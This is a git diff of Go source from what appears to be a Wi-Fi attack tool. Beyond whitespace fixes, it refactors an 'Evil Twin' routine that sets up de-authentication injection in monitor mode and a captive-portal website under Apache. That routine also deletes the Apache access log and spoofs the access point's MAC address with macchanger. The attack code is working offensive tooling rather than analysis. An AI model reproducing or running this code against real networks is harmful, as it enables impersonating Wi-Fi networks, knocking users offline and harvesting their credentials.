@@ -152,7 +152,7 @@ func collect() (prefix string, channelList []int, pcapWriteFile string, fileLoad
 				os.Exit(1)
 			}
 		case *nmrestart:
-                        libs.Rtexec(exec.Command("bash", "-c", "killall dnsmasq hostapd"))
+			libs.Rtexec(exec.Command("bash", "-c", "killall dnsmasq hostapd"))
 			if _, err := libs.Rtexec(exec.Command("bash", "-c", "iptables --flush && iptables -t nat --flush && service networking restart && service NetworkManager restart && service apache2 stop")); err {
 				fmt.Println("Unable to restart Network Manager.")
 				os.Exit(1)
@@ -656,7 +656,7 @@ func handlePacket(handle *pcap.Handle, chans []int, prefix string, filter bool, 
 	}
 }
 
-// Reset view of inactive device on analyzer table (restoring of all info) 
+// Reset view of inactive device on analyzer table (restoring of all info)
 func resetPreActive() {
 	mutex.Lock()
 	for mac := range analysisData.ClientData {
@@ -1371,7 +1371,7 @@ func printChart(offline bool) {
 	}
 }
 
-// Preliminaries (same setup()) for ONLY pcap file reading 
+// Preliminaries (same setup()) for ONLY pcap file reading
 func loaderSetupView(file string) {
 	color = libs.SetupColors()
 	libs.PrintLogo(color, "Initializing...")
@@ -1545,78 +1545,79 @@ func deepScanning(channelList []int, bssid string) {
 // Run Evil Twin attack with captive portal function
 func runEvilTwin(nameiface string) {
 	var nodeauthStarting bool = false
+	var webmodel = "EvilTwin/html" // default until model selecter
 	var handle2 *pcap.Handle
 	apnameiface = nameiface
-	tableinj.ESSID = " " + tableinj.ESSID
-	for {
+	tableinj.ESSID = fmt.Sprintf(" %s", tableinj.ESSID)
+	for step := 0; step < 2; step++ {
 		time.Sleep(350 * time.Millisecond)
 		libs.PrintLogo(color, "Setup Evil-Twin attack...")
 		time.Sleep(1 * time.Second)
-		var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
-		var ifacesFound bool = false
-		fmt.Fprintf(writer, "%s\tIndex\tInterface\tDriver\tChipset\n", color.White)
-		var avifaces []libs.Ifaces
-		for _, iface := range libs.ShowIfaces() {
-			if apnameiface == iface.Name {
-				continue
+		switch step {
+		case 0:
+			// website model selecter for captive portal (soon)
+		case 1:
+			var ifacesFound bool = false
+			var avifaces []libs.Ifaces
+			var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
+			fmt.Fprintf(writer, "%s\tIndex\tInterface\tDriver\tChipset\n", color.White)
+			for _, iface := range libs.ShowIfaces() {
+				if apnameiface == iface.Name {
+					continue
+				} else if ifaceinfo, err := libs.GetIfaceInfo(iface.Name); !err {
+					avifaces = append(avifaces, libs.Ifaces{Name: iface.Name})
+					ifacesFound = true
+					fmt.Fprintf(writer, "%s\t%s\t%s\t%s\t%s", color.White, strconv.Itoa(len(avifaces)-1), iface.Name, ifaceinfo[3], ifaceinfo[4])
+				}
 			}
-			if ifaceinfo, err := libs.GetIfaceInfo(iface.Name); !err {
-				avifaces = append(avifaces, libs.Ifaces{Name: iface.Name})
-				ifacesFound = true
-				fmt.Fprintf(writer, "%s\t%s\t%s\t%s\t%s", color.White, strconv.Itoa(len(avifaces)-1), iface.Name, ifaceinfo[3], ifaceinfo[4])
-
-			}
-		}
-		if ifacesFound {
-			writer.Flush()
-			var ifaceindexScan string
-			time.Sleep(1500 * time.Millisecond)
-			fmt.Printf("\n\n%s[%sINPUT%s] Select available network interface for De-Auth [0-%s] (default: no-adapter mode): ", color.White, color.Green, color.White, strconv.Itoa(len(avifaces)-1)+"] (default: no-adapter mode): ")
-			fmt.Scanln(&ifaceindexScan)
-			fmt.Println()
-			if ifaceindexScan == "" {
-				libs.NOTIMECustomLog(color, color.Blue, "LOG", "Starting without De-Auth injection...")
-				nodeauthStarting = true
-				time.Sleep(3 * time.Second)
-				break
-			}
-			if ifaceindex, err := strconv.Atoi(ifaceindexScan); err == nil {
-				if ifaceindex < 0 || ifaceindex > len(avifaces)-1 {
-					libs.Error(color, "Selection error, updating...\n")
-					time.Sleep(2 * time.Second)
-				} else {
-					nameiface = avifaces[ifaceindex].Name
-					if !libs.MonSupportCheck(nameiface) {
-						libs.Error(color, fmt.Sprintf("%s don't support monitor mode, updating...\n", apnameiface))
-						time.Sleep(2 * time.Second)
-					} else if tableinj.CHANNEL > 14 && !libs.G5Check(nameiface) {
-						libs.Error(color, fmt.Sprintf("%s don't support 5 Ghz (iface's channel: %d), updating...\n", apnameiface, tableinj.CHANNEL))
+			if ifacesFound {
+				writer.Flush()
+				var ifaceindexScan string
+				time.Sleep(1500 * time.Millisecond)
+				fmt.Printf("\n\n%s[%sINPUT%s] Select available network interface for De-Auth [0-%s] (default: no-adapter mode): ", color.White, color.Green, color.White, strconv.Itoa(len(avifaces)-1))
+				fmt.Scanln(&ifaceindexScan)
+				fmt.Println()
+				if ifaceindexScan == "" {
+					libs.NOTIMECustomLog(color, color.Blue, "LOG", "Starting without De-Auth injection...")
+					nodeauthStarting = true
+					time.Sleep(3 * time.Second)
+				} else if ifaceindex, err := strconv.Atoi(ifaceindexScan); err == nil {
+					if ifaceindex < 0 || ifaceindex > len(avifaces)-1 {
+						libs.Error(color, "Selection error, updating...\n")
 						time.Sleep(2 * time.Second)
 					} else {
-						fmt.Printf("%s[%sLOG%s] %s: Setting up monitor mode ...", color.White, color.Blue, color.White, nameiface)
-						if err := libs.SetMonitorMode(nameiface); err {
-							fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
-							libs.Error(color, "Bad interface.")
+						nameiface = avifaces[ifaceindex].Name
+						if !libs.MonSupportCheck(nameiface) {
+							libs.Error(color, fmt.Sprintf("%s don't support monitor mode, updating...\n", apnameiface))
+							time.Sleep(2 * time.Second)
+						} else if tableinj.CHANNEL > 14 && !libs.G5Check(nameiface) {
+							libs.Error(color, fmt.Sprintf("%s don't support 5 Ghz (iface's channel: %d), updating...\n", apnameiface, tableinj.CHANNEL))
 							time.Sleep(2 * time.Second)
 						} else {
-							time.Sleep(1200 * time.Millisecond)
-							fmt.Println("Done")
-							handle2 = libs.GetMonitorSniffer(nameiface, color)
-							break
+							fmt.Printf("%s[%sLOG%s] %s: Setting up monitor mode ...", color.White, color.Blue, color.White, nameiface)
+							if err := libs.SetMonitorMode(nameiface); err {
+								fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
+								libs.Error(color, "Bad interface.")
+								time.Sleep(2 * time.Second)
+							} else {
+								time.Sleep(1200 * time.Millisecond)
+								fmt.Println("Done")
+								handle2 = libs.GetMonitorSniffer(nameiface, color)
+								break
+							}
 						}
 					}
+				} else {
+					libs.Error(color, "Selection error (is number?), updating...\n")
+					time.Sleep(2 * time.Second)
 				}
 			} else {
-				libs.Error(color, "Selection error (is number?), updating...\n")
-				time.Sleep(2 * time.Second)
+				libs.PrintLogo(color, "Setup Evil-Twin attack...")
+				libs.Warning(color, "No valid interface found: Starting without De-Auth injection...\n")
+				nodeauthStarting = true
+				apnameiface = nameiface
+				time.Sleep(3 * time.Second)
 			}
-		} else {
-			libs.PrintLogo(color, "Setup Evil-Twin attack...")
-			libs.Warning(color, "No valid interface found: Starting without De-Auth injection...\n")
-			nodeauthStarting = true
-			apnameiface = nameiface
-			time.Sleep(3 * time.Second)
-			break
 		}
 	}
 	var trycounter int = 0
@@ -1644,7 +1645,7 @@ func runEvilTwin(nameiface string) {
 			changedMac = tableinj.SRC[0][:len(tableinj.SRC[0])-1] + "1"
 		}
 		var ETSetupCommands []string = []string{"cd /etc/apache2/conf-enabled && ln -f -s ../conf-available/override.conf override.conf && cd /etc/apache2/mods-enabled && ln -f -s ../mods-available/rewrite.load rewrite.load && rm /var/log/apache2/access.log && touch /var/log/apache2/access.log",
-			"cp -Rf EvilTwin/html /var/www/ && chown -R www-data:www-data /var/www/html && chown root:www-data /var/www/html/.htaccess",
+			fmt.Sprintf("cp -Rf %s /var/www/ && chown -R www-data:www-data /var/www/html && chown root:www-data /var/www/html/.htaccess", webmodel),
 			fmt.Sprintf("ifconfig %s down", apnameiface),
 			fmt.Sprintf("macchanger -m %s %s", libs.Fmac(changedMac), apnameiface),
 			fmt.Sprintf("ifconfig %s up", apnameiface),
